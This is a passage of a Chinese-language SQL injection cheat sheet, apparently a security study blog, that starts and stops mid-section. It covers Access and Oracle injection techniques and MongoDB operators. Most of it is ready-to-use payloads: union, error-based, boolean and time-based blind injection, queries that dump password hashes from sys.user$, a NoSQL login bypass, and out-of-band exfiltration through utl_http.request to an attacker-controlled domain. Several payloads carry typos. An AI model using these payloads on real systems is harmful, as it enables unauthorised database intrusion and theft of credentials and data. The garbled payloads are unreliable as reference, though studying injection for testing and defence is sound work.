(select top 1 username from user)</span><br></pre></td></tr></tbody></table></figure><h3 id="Access-布尔盲注"><a href="#Access-布尔盲注" class="headerlink" title="Access_布尔盲注"></a><strong>Access_布尔盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">?id=1 and 1=1 或 and 1=0</span><br><span class="line"># 查看第 1 行,第 1 个字母</span><br><span class="line">?id=1 and (select top 1 asc(mid(username,1,1)) from user)&gt;97</span><br><span class="line"># 查看第 2 行,第 1 个字母</span><br><span class="line">?id=1 and (select top 1 asc(mid(username,1,1)) from user where id not in (select top 1 id from user))&gt;97</span><br></pre></td></tr></tbody></table></figure><h3 id="Access-偏移注入"><a href="#Access-偏移注入" class="headerlink" title="Access_偏移注入"></a><strong>Access_偏移注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/**借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示。</span><br><span class="line">成功与否看技巧与运气，不能保证100%成功，无需管理员账号密码字段，直接爆账号密码，很大程度上解决猜不到字段的问题。</span><br><span class="line">偏移注入的利用条件：</span><br><span class="line"></span><br><span class="line">已知管理表名</span><br><span class="line">已知任意字段（一个或多个会增加机率，最常见的就是id）</span><br><span class="line">成功率的因素</span><br><span class="line"></span><br><span class="line">管理表的字段数越少越好（最好是三个:id 账号字段 密码字段）</span><br><span class="line">当前注入点的脚本内查询的表内的字段数越多越好（最好有几十个，这样基本成功率是100%）</span><br><span class="line">已知的字段数越多越好（id一般存在**/</span><br><span class="line">#第一步:使用之前的方法得到显示点为2,3，字段个数为7，但是我们并不知道列名</span><br><span class="line">?id=1 union select 1,2,3,4,5,6,7 from user</span><br><span class="line">#第二步:用*依次向前替换数字字段，直到页面显示正常。例如在5替换为*后页面返回正常</span><br><span class="line">?id=1 union select 1,2,3,4,* from user</span><br><span class="line">#说明星号替换了3个字段(也就是表中有三个字段),后续要使用inner jion自表连接查询，因此计算字</span><br><span class="line">段数乘以2是否小于当前列(3*2&lt;7)</span><br><span class="line">#第三步:公式成立的话，用inner jion自连接查询</span><br><span class="line">?id=1 union select 1,* from (user as a inner join user as b on a.id=b.id)</span><br><span class="line">#如果是更多位，可再接inner join</span><br><span class="line">?id=1 union select 1,* from ((user as a inner join user as b on a.id=b.id) inner join user as c a.id=c.id)</span><br></pre></td></tr></tbody></table></figure><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><h3 id="Oracle-基础操作"><a href="#Oracle-基础操作" class="headerlink" title="Oracle_基础操作"></a><strong>Oracle_基础操作</strong></h3><table><thead><tr><th align="center">类型</th><th align="center">含义</th><th align="center">存储描述</th></tr></thead><tbody><tr><td align="center">Char()</td><td align="center">字串型</td><td align="center">最大长度2000, 不足时用空格补充</td></tr><tr><td align="center">Carchar2()</td><td align="center">字串型</td><td align="center">最大长度4000, 实际长度由存储数据长度绝定</td></tr><tr><td align="center">Number(x,y)</td><td align="center">数字型</td><td align="center">浮点型, 整型, 都可以存储, x 表示最大位数, y 表示小数位的最大位数</td></tr><tr><td align="center">Date</td><td align="center">日期(日-月-年)</td><td align="center">存储时间类型</td></tr><tr><td align="center">Clob</td><td align="center">字符数据</td><td align="center">存储较大的文本, 比如非结构话的XML文档, 最大位4G</td></tr><tr><td align="center">Blob</td><td align="center">二进制数据</td><td align="center">存储二进制对象,图像,音频,视频等</td></tr><tr><td align="center">long</td><td align="center">超上字符串</td><td align="center">存储较长字符串,最大长度为2G</td></tr></tbody></table><table><thead><tr><th align="center">数据库基本操作</th><th align="left"></th></tr></thead><tbody><tr><td align="center">创建表</td><td align="left">creata table 表名(字段名 类型 约束)</td></tr><tr><td align="center"></td><td align="left">creata table test (name char(10) primary key.age tinyint)</td></tr><tr><td align="center">增加字段</td><td align="left">alter table 表名 add(字段名称, 数据类型)</td></tr><tr><td align="center"></td><td align="left">alter table test add(clss_name varchar2(200))</td></tr><tr><td align="center">删除一列</td><td align="left">alter table 表名 set unused column 列名</td></tr><tr><td align="center"></td><td align="left">alter table test set unused column class_name</td></tr><tr><td align="center">修改字段与类型</td><td align="left">alter table 表名 modify(字段名, 新字段类型)</td></tr><tr><td align="center"></td><td align="left">alter table test modify(name varchar(200))</td></tr><tr><td align="center">插入数据</td><td align="left">insert into 表名 values(所有字段对应的值);</td></tr><tr><td align="center"></td><td align="left">insert into test values(字段名1,字段名2) values(‘a’, 18)</td></tr><tr><td align="center">更新数据</td><td align="left">update 表名 set 字段名 = 值 where 更新条件</td></tr><tr><td align="center"></td><td align="left">update test set age = 20 where name = ‘a’</td></tr><tr><td align="center">删除数据</td><td align="left">delete 表名 where 条件</td></tr><tr><td align="center"></td><td align="left">delete test where name = ‘a’</td></tr><tr><td align="center">Truncate</td><td align="left">truncate table 表名        # 将表中数据一次性删除</td></tr><tr><td align="center"></td><td align="left">truncate删除速度快且不能恢复, delete删除数据可以在日志中恢复</td></tr></tbody></table><table><thead><tr><th align="center">数据库</th><th></th></tr></thead><tbody><tr><td align="center">dba_tables</td><td>系统里所有的表的信息,需要DBA权限才能查看</td></tr><tr><td align="center">all_tables</td><td>当前用户有权限的表的信息</td></tr><tr><td align="center">user_tables</td><td>当前用户名下的表的信息</td></tr><tr><td align="center"></td><td>dba_tables &gt;= all_tables &gt;= user_tables</td></tr><tr><td align="center">dba_all_tables</td><td>用户所拥有的或有访问权限的对象和表</td></tr><tr><td align="center">all_all_tables</td><td>某一个用户所拥有的或有访问权限的对象和表</td></tr><tr><td align="center">user_all_tables</td><td>某一个用户所拥有的对象和表</td></tr><tr><td align="center">utl_http.request</td><td>查看服务器出口 IP</td></tr><tr><td align="center">utl_inaddr.get_host_address</td><td>查看服务器监听 IP</td></tr><tr><td align="center">v$logfile</td><td>查看服务器操作系统</td></tr><tr><td align="center">dual</td><td>数据库的一个空表, 所有用户都可以使用</td></tr><tr><td align="center">like</td><td>模糊查询            # like ‘a%’</td></tr><tr><td align="center">||</td><td>连接字串符合    #</td></tr><tr><td align="center">rownum = 1</td><td>类似于MySql里面的 limit 1,1</td></tr><tr><td align="center">distinct</td><td>去重</td></tr><tr><td align="center">length</td><td>计算字串长度</td></tr><tr><td align="center">count</td><td>计算数量</td></tr><tr><td align="center">where exist</td><td>判断条件是否正常执行</td></tr><tr><td align="center">sys.all.tables</td><td>所有库表所在</td></tr><tr><td align="center">user_tab_colums</td><td>所有字段所在</td></tr><tr><td align="center">owner</td><td>库名字段</td></tr><tr><td align="center">table_name</td><td>表名字段</td></tr><tr><td align="center">查看服务器sid</td><td>select instance_name from v$instance</td></tr><tr><td align="center">当前连接用户</td><td>select sys_context (‘userenv’, ‘current_user’) from dual</td></tr><tr><td align="center">当前用户</td><td>select user from dual;</td></tr><tr><td align="center">列出所有用户</td><td>select username from  all_users order by username;</td></tr><tr><td align="center">列出数据库</td><td>select distinct owner from all_tables;</td></tr><tr><td align="center">列出表名</td><td>select table_name from all_tables;</td></tr><tr><td align="center">所有列</td><td>select column_name from all_tab_columns where table_name = ‘admin/表名’</td></tr><tr><td align="center">定位文件</td><td>select name from v$datafile;</td></tr><tr><td align="center"></td><td></td></tr><tr><td align="center"></td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 列出密码哈希:</span><br><span class="line">SELECT name, password, astatus FROM sys.user$ — priv; &lt;= 10g(astatus能够在acct被锁定的状态下给你反馈) SELECT name,spare4 FROM sys.user$ — priv; 11g</span><br><span class="line"># 获取数据库所有用户:</span><br><span class="line">SELECT username FROM all_users ORDER BY username;</span><br><span class="line">SELECT name FROM sys.user$; -- priv;</span><br><span class="line"># 获取当前用户权限</span><br><span class="line">SELECT * FROM session_privs; </span><br><span class="line"># 获取所有用户权限</span><br><span class="line">SELECT * FROM dba_sys_privs -- priv;  </span><br><span class="line"># 获取用户角色</span><br><span class="line">SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</span><br><span class="line">SELECT DISTINCT grantee FROM dba_sys_privs;</span><br><span class="line"># 获取所有数据库用户密码</span><br><span class="line">SELECT name, password, astatus FROM sys.user$; -- priv, &lt;= 10g;</span><br><span class="line">SELECT name, spare4 FROM sys.user$; -- priv, &gt;= 11g; </span><br><span class="line"># 列出DBA账户:</span><br><span class="line">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv;</span><br><span class="line"># 获取主机名和IP</span><br><span class="line">SELECT UTL_INADDR.get_host_name FROM dual;</span><br><span class="line">SELECT host_name FROM v$instance;</span><br><span class="line">SELECT UTL_INADDR.get_host_address FROM dual;  查IP</span><br><span class="line">SELECT UTL_INADDR.get_host_name(‘127.0.0.1’) FROM dual;  查主机名称</span><br></pre></td></tr></tbody></table></figure><h3 id="Oracle-联合查询"><a href="#Oracle-联合查询" class="headerlink" title="Oracle_联合查询"></a><strong>Oracle_联合查询</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入类型</span><br><span class="line">?id=1'"\ 或 and 1=0, and 1=1</span><br><span class="line"># 判断字段数</span><br><span class="line">?id=1 order by 4 </span><br><span class="line"># 判断显示位, 和MySQL不同, Oracle判断显示位时需要使用 null, 而且最后必须跟上 from dual </span><br><span class="line">?id=1 union select null, null, null, null from dual</span><br><span class="line"># 判断显示位类型</span><br><span class="line">?id=1 union select 1,'a',3,4 from dual</span><br><span class="line"># 查看当前数据库 实例 </span><br><span class="line">?id=1 union select 1, (select instance_name),3,4 from dual --</span><br><span class="line"># 查看数据库版本</span><br><span class="line">?id=1 union select 1,banner,3,4 from v$version where rownum = 1</span><br><span class="line"># 查看当前连接的用户</span><br><span class="line">?id=1 union select 1,user,3,4 from dual where rownum = 1</span><br><span class="line"># 查看所有数据库 limit = 1 数字变换, 查看下一个数据库名</span><br><span class="line">?id=1  union select 1,(select owner from (select owner.rownum as limit from (select distinct(owner) from sys.all_tables)) where limit = 1),3,4 from dual</span><br><span class="line"># 查看指定库表</span><br><span class="line">?id=1 union select 1,table_name,3,4 from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1</span><br><span class="line"># 查看字段</span><br><span class="line">?id=1 union select 1,column_name,3,4 from (select column_name,rownum as limit from (select column_name from all_tab_columns where table_name = '表名')) where limit = 1</span><br><span class="line"># 查看数据</span><br><span class="line">?id=1 union select 1,"字段1"||%27~%27||"字段2",3,4 from 库名.表名</span><br><span class="line"># 第二种写法 查看所有数据</span><br><span class="line">?id=1 union select 1,data,3,4 from (select</span><br><span class="line">data,rownum as limit from (select "字段1"||%27~%27||"字段2"||%27~%27||"字段3"||%27~%27||"字段4" as data from 库名.表名)) where limit = 1</span><br></pre></td></tr></tbody></table></figure><h3 id="Oracle-报错注入"><a href="#Oracle-报错注入" class="headerlink" title="Oracle_报错注入"></a><strong>Oracle_报错注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 一共有 7 个报错函数</span><br><span class="line"># 1. 查看当前连接的用户</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin(sys_context('userenv','current_user')) from dual) in not null</span><br><span class="line"># 2. 查看主机名</span><br><span class="line">?id=1 and utl_ianddr.get_host_name(sys_context('userenv', current_user)) = 1</span><br><span class="line"># 3.</span><br><span class="line">?id=1 and ctxsys.drithsx.sn(sys_context('userenv', 'current_user')) = 1</span><br><span class="line"># 4.</span><br><span class="line">?id=1 and ordsys.ord_dicom.getmappingxpath(sys_context('userenv', current_user)) = 1</span><br><span class="line"># 5.</span><br><span class="line">?id=1 and (select dbms_xdb_version.uncheckout(sys_context('userenv', current_user)) from dual) is not null</span><br><span class="line"># 6.</span><br><span class="line">?id=1 and (select dams_xdb_version.makeversioned(sys_context('userenv', 'current_user')) from dual) is not null</span><br><span class="line"># 7.</span><br><span class="line">?id=1 and (select dbms_utility.sqlid_to_sqlhash(sys_context('userenv', 'current_user')) from dual) is not null</span><br><span class="line"></span><br><span class="line"># 爆库</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from all_table)) where limit = 1)) from dual) is not null</span><br><span class="line"># 爆表</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select owner from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1)) from dual) is not null</span><br><span class="line"># 爆字段</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select column_name, rownum as limit from (select column_name from all_tab_columns where table_name = '表名')) where limit = 1) from dual) is not null</span><br><span class="line"># 爆数据</span><br><span class="line">?id=1 and (select dbms_xdb_version.checkin((select data from (select datam rownum as limit from (select "字段1"||%27~%27||"字段2" as data from 库名.表名)) where limit = 1)) from dual) is not null</span><br></pre></td></tr></tbody></table></figure><h3 id="Oracle-布尔盲注"><a href="#Oracle-布尔盲注" class="headerlink" title="Oracle_布尔盲注"></a><strong>Oracle_布尔盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">?id=1 and 0&gt;6 或 0&lt;6</span><br><span class="line"># 判断数据库数量</span><br><span class="line">?id=1 and (select count(distinct(owner)) from all_tables) = 10</span><br><span class="line"># 判断第 1 个 库的库名长度</span><br><span class="line">?id=1 and (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 5</span><br><span class="line"># 判断第 1 个 库的库名的第一个字母</span><br><span class="line">?id=1 and (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 100</span><br><span class="line"># 判断指定库中,表的数量</span><br><span class="line">?id=1 and (select count(table_name) from all_tables where owner = '库名') = 5</span><br><span class="line"># 判断指定库中, 第 1 个表的长度</span><br><span class="line">?id=1 and (select length(table_name) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit =1) = 4</span><br><span class="line"># 判断指定库中, 第 1 个表的第 1 个字母</span><br><span class="line">?id=1 and (select ascii(substr(table_name,1,1)) from (select table_name, rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1) = 100</span><br></pre></td></tr></tbody></table></figure><h3 id="Oracle-时间盲注"><a href="#Oracle-时间盲注" class="headerlink" title="Oracle_时间盲注"></a><strong>Oracle_时间盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 时间盲注的函数区别于其他数据库, 由 case when then else end 组成</span><br><span class="line"># 睡觉函数: dbms_pipe.receive_message(1,3)</span><br><span class="line"># 语法: (case when (payload) then dbms_pipe.receive_message(1,3) else 1 end)</span><br><span class="line"># 判断注入, 是否睡眠 3 秒</span><br><span class="line">?id=1 and 1=1 dbms_pipe.receive_message(1, 3)</span><br><span class="line"># 判断数据库数量</span><br><span class="line">?id=1 and (case when (select count(distinct(owner)) from all_tables) &gt; 10 then dbms_pipeive_message(1, 3) else 1 end) = 1</span><br><span class="line"># 判断第一个数据的库名长度</span><br><span class="line">?id=1 and (case when (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1) = 5 then dbms_pipeive_message(1, 3)else 1 end) = 1</span><br><span class="line"># 判断第 1 个数据库名的第 1 个字母</span><br><span class="line">?id=1 and (case when (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)=84 then dbms_pipe.receive_message(1,3) else 1 end) = 1</span><br><span class="line"></span><br><span class="line"># 判断指定库中第 1 个表的长度</span><br><span class="line">?id=1 and (case when (select length(table_name) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1) = 4 then</span><br><span class="line">dbms_pipe.receive_message(1, 3) else 1 end) = 1</span><br><span class="line"># 判断指定库中第 1 个表的第 1 个字母</span><br><span class="line">id=1 and (case when (select ascii(substr(table_name,1,1)) from (select table_name,rownum as limit from (select table_name from all_tables where owner = '库名')) where limit = 1 ) = 68 then dbms_pipe.receive_message(1, 3) else 1 end) = 1</span><br></pre></td></tr></tbody></table></figure><h3 id="Oracle-数据外带"><a href="#Oracle-数据外带" class="headerlink" title="Oracle_数据外带"></a><strong>Oracle_数据外带</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 相关函数</span><br><span class="line">utl_http.request() </span><br><span class="line">utl_inaddr.get_host_address()</span><br><span class="line">sys.dbm_ldap.init() # 需要在自己电脑上开启http协议</span><br><span class="line"># 示例:</span><br><span class="line">?id=1 and (select utl_http.request('http://oracle.dns域名/data=||拼接payload') from dual) is not null</span><br><span class="line"># 示例:</span><br><span class="line">?id=1 and (select utl_http.request('http://oracle.dns域名/?data='||sys_context('userenv','currrent_user')) from dual ) in not null</span><br><span class="line">#</span><br><span class="line">?id=1 and (select utl_http.request((select 'http://oracle.dns域名/?data='||owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables))where limit = 1)) from dual</span><br><span class="line">#</span><br><span class="line">?id=1 and (select utl_http.request((select 'http://oracle.dns域名/?data='||data from (select data,rownum as limit from (select id||chr(126)||name||chr(126)|| sex as data from 库名.表名)) where limit = 1)) from dual</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># Not Only SQL 泛指非关系型数据库</span><br><span class="line">​redis# key = value 方式存储</span><br><span class="line">​mongodb半nosql半sql# {'key: value', 'key: value'} join方式存储</span><br><span class="line">​HBase</span><br><span class="line">​apache Cassandra</span><br><span class="line"></span><br><span class="line"># key = value  以键值对的方式存储数据</span><br><span class="line"># img = {author: '', 'url': '', ......, type: img} 查询数据的速度较快</span><br><span class="line"># mongodb 未授权, 不需要帐号密码直接登录的漏洞</span><br><span class="line"># 基本操作</span><br><span class="line"># 登录</span><br><span class="line">mongo --host 127.0.0.1</span><br><span class="line">show dbs # 查看所有数据库</span><br><span class="line">use数据库名 # 切换数据库, 数据库不存在会自动创建</span><br><span class="line">show collections # 查看集合</span><br><span class="line">db.dropDatabase()# 进入数据库后,如果没有选择任何数据库,会删除默认的test数据库</span><br><span class="line"># 集合</span><br><span class="line">show collections # 查看集合</span><br><span class="line">db.creataCollection('xx') # 创建集合</span><br><span class="line">db.xxx.drop() # 删除集合</span><br><span class="line"># 文档操作</span><br><span class="line">da.xx.insert({key:value}) # 增加数据</span><br><span class="line">db.xx.remove({删除的条件}) # 条件为空,全部删除</span><br><span class="line">db.xx.remove({age:10}) # 删除所有符合条件的数据</span><br><span class="line">db.xx.remove({gender.true},{justOne.true}) # 只删除符合条件的第一个数据</span><br><span class="line">db.xx.update({查找的条件},{修改的内容}) # 更新数据</span><br><span class="line">db.xx.update({查找的条件},{$set{修改的内容}}) # 添加数据</span><br><span class="line"># 文档查询</span><br><span class="line">db.xx.find({查询条件}) # 为空,查询所有数据</span><br><span class="line">db.xx.find({age:10}) # 查询指定条件的所有内容</span><br><span class="line">db.xx.findOne({age:10}) # 查询指定条件的第一条</span><br><span class="line">db.xx.find({age:10}).pretty() # 格式化输出</span><br><span class="line"></span><br><span class="line"># 爆破</span><br><span class="line"># burp锁定POST参数 帐号admin为永真,密码用正则,简单清单跑出密码为123456,</span><br><span class="line">logname[$ne]=admin&amp;logpass[$regex]=e</span><br></pre></td></tr></tbody></table></figure><table><thead><tr><th>$regex    # 正则</th><th>$ne     # 不等于 !=</th><th>$not      # 反匹配</th></tr></thead><tbody><tr><td>$nin      # not in</td><td>$in     # in</td><td>$or     #  or</td></tr><tr><td>$it        # &lt;</td><td>$gt     # &gt;</td><td>$ite     # &lt;=</td></tr><tr><td>$gte      # &gt;=</td><td>$all     # all</td><td></td></tr></tbody></table><hr><h3 id="区别信息"><a href="#区别信息" class="headerlink" title="区别信息"></a><strong>区别信息</strong></h3><p>国内网站ASP+Access或SQLServer占70%以上，PHP+MySQL占20%。</p><p>一般asp+access组合比较多，aspx+mssql(SQL Server)组合比较多</p><p>一.数据库查询关键词<br>查询中用到的关键词主要包含六个，并且他们的顺序依次为selcet–from–where–group by–having–order by</p><p>其中select和from是必须的，其他关键词是可选的，这六个关键词的执行顺序与sql语句的书写顺序并不是一样的，而是按照下面的顺序来执行</p><p>from–where–group by–having–select–order by</p><p>from：需要从哪个数据表检索数据</p><p>where：过滤表中数据的条件</p><p>group by：如何将上面过滤出的数据分组</p><p>having：对上面已经分组的数据进行过滤的条件</p><p>select：查看结果集中的那个列，或列的结果</p><p>order by：按照什么样的顺序来查看返回的数据</p><p>常用数据库<br>常见的数据库有Oracle、MySQL、SQL Server（MSsql）、Access、mongodb等</p><p>关系型数据库通过外键关联来建立表与表之间的关系，非关系数据库通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。</p><p>基于特定函数，判断数据库类型<br>（1）  len()和length()<br>在mssql和mysql以及db2内，返回长度值调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。</p><p>当你使用and len(‘a’)=1的时候，返回正常页面时，可以推断当前数据库类型可能是mssql,或mysql或是db2,反之可能会是orcale和informix.</p><p>（2）  @@version和version()<br>在mysql内，可以用@@version或是version()来返回当前的版本信息。但是无法判断mysql还是mssql时，可以用version()函数来构造判断。</p><p>version()&gt;1的返回与@@version&gt;1相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。</p><p>（3）   substring()和substr()<br>在mssql中可以调用substring()。oracle则只可以调用substr()。</p><p>（4）   length()   lengthb()  char_length()<br>1、Oracle： length(): 表示字符串长度 ； lengthb()：表示字符串的字节长度</p><p>2、mysql： length()：返回字符串所占的字节数； char_length()：返回字符串的字符数</p><p>基于其他方式，判断数据库类型<br>(1)  注释符判断</p><p>–是 Oracle 和 MSSQL 支持的注释符，如果返回正常，则说明为是这两种数据库类型之一</p><p>;是子句查询标识符，Oracle 不支持多行查询，因此如果返回错误，则说明很可能是 Oracle</p><p>(2)   特定语句</p><p>注意：Access只有一个数据库，直接猜解表名即可</p><p>and ( select count(*) from sys.usr_tables) &gt; 0 oracle数据库</p><p>and (select count(*) from msysobjects) &gt; 0 -返回权限不足为access数据库</p><p>and (select count(*)from MSysAccessObjects)&gt;0 返回正确为access 数据库</p><p>and (select count(*)from sysobjects)&gt;0 返回正常说明是 mssql 数据库</p><p>and length(user())&gt;10 返回正常说明是 Mysql</p><p>Oracle 可以根据 from dual 虚拟库判断</p><p>（3） 判断注入点</p><p>数字型：id=2-1</p><p>字符型： ’ 、’)、 ‘))、 “、 “)、 “))</p><p>注释符：– （–空格）、–+、/**/、#</p><p>通过观察页面是否正常，判断页面是否存在注入点</p><p>如 id=21’ and 1=1 %23 页面正常</p><p>id=21’ and 1=2 %23 页面返回无数据</p><p>MySQL 与 MSSQL 及 ACCESS 之间的区别</p><p>(1)MySQL5.0 以下没有 information_schema 这个默认数据库</p><p>(2)ACCESS 没有库名，只有表和字段，并且注入时，后面必须跟表名，因此只能爆表，ACCESS</p><p>举例：select 1,2,3 from table_name union select 1,2,3 from table_name</p><p>(3)MySQL 使用 limit 排序，ACCESS 使用 TOP 排序（TOP 在 MSSQL 也可使用）</p><p>各数据库标志性信息<br>sql server: select @@version –</p><p>Oracle : select banner from v$version</p><p>mysql ：select @@version, version() –</p><p>postgresql: select version() –</p><p>各数据库特有的函数<br>sql server: @@pack_received @@rowcount</p><p>mysql: connection_id() last_insert_id() row_count()</p><p>oracle: bitand(1,1)</p><p>postgresql: select extract( dow from row())</p><p>对于字符串处理方式<br>sql server: id=1 and ‘a’+’b’=’ab’ –</p><p>mssql: id=1 and ‘a’ + ‘b’ = ‘ab’</p><p>mysql: id= 1 and ‘a’+’b’=’ab’ ,’ab’=concat(‘a’ , ‘b’)</p><p>oracle: id=1 and ‘a’+’b’ = ‘a’ || ‘b’ , ‘ab’=concat(‘a’ , ‘b’)</p><p>postgresql: id=1 and ‘a’ + ‘b’ = ‘a’ || ‘b’, ‘ab’ = concat(‘a’ , ‘b’)</p><p>特殊符号，注释的判断</p><p>1、”null” 和 “%00” 是Access支持的注释</p><p>2、”;” 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。</p><p>(SQL Server) MSsql服务、端口、后缀<br>端口：1433</p><p>后缀：cracer.mdf</p><p>日志文件后缀：cracer_log.ldf</p><p>mssql数据库权限</p><p>sa权限：数据库操作，文件管理，命令执行，注册表读取等system</p><p>db权限：文件管理，数据库操作等users-administrators</p><p>public权限：数据库操作guest-users</p><p>SQL Server有一些系统变量，如果服务器IIS提示没关闭，并且SQL Server返回错误提示的话，那可以直接从出错信息的获取，方法如下：</p><p>？id=49 and user&gt;0</p><p>这句语句很简单，但却包含了SQL Server特有注入方法的精髓，我自己也是在一次无意的测试中发现这种效率极高的猜解方法。</p><p>先看看含义，前面语句正常，重点在and user&gt;0, user是SQL Server的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQL Server的出错提示是：将nvarchar值”abc”转换数据类型为int的列时发生语法错误，abc正是变量user的值，这样，就拿到了数据库的用户名。</p><p>常用测试语句：</p><p> and exists(select* from sysobjects)       //判断数据库是否为SQLServer<br> and exists(select * from tableName)       //判断某表是否存在..tableName为表名<br> and 1=(select @@VERSION)                  //SQLServer版本<br> and 1=(select db_name())                  //当前数据库名<br> and 1=(select @@servername)               //本地服务名<br> and 1=(select 